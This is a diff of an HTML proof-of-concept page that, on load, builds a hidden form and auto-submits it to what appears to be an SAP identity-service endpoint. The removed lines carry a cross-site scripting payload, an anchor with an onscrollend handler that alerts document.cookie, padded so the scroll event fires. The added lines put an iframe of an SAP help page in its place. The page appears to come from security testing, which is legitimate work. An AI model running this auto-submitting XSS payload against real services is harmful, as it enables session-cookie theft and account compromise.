@@ -4,31 +4,17 @@
   <title>Auto POST Request with Payload</title>
 </head>
 <body>
+<iframe src="https://help.sap.com/webassistant/context?id=32497794" width="500" height="500"></iframe>
+  
   <script>
     window.onload = function() {
       // Define the payload data as an object
-      const payload = {
-  annual: "\"<a/href=google.com><a/onscrollend=alert(document.cookie) style=display:block;overflow:auto;border:1px/dashed;width:500px;height:100px;><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span/id=x>test</span></a>",
-year1: "25",
-year2: "25",
-year3: "25",
-      };
 
+      
       // Create a new form element
       const form = document.createElement("form");
       form.method = "GET";
       form.action = "https://injection.accounts.ondemand.com/service/um/C5374468"; // Replace with your API endpoint
-
-      // Populate the form with hidden input fields for each payload key-value pair
-      for (const key in payload) {
-        if (payload.hasOwnProperty(key)) {
-          const input = document.createElement("input");
-          input.type = "hidden";
-          input.name = key;
-          input.value = payload[key];
-          form.appendChild(input);
-        }
-      }
 
       // Append the form to the document and submit it
       document.body.appendChild(form);
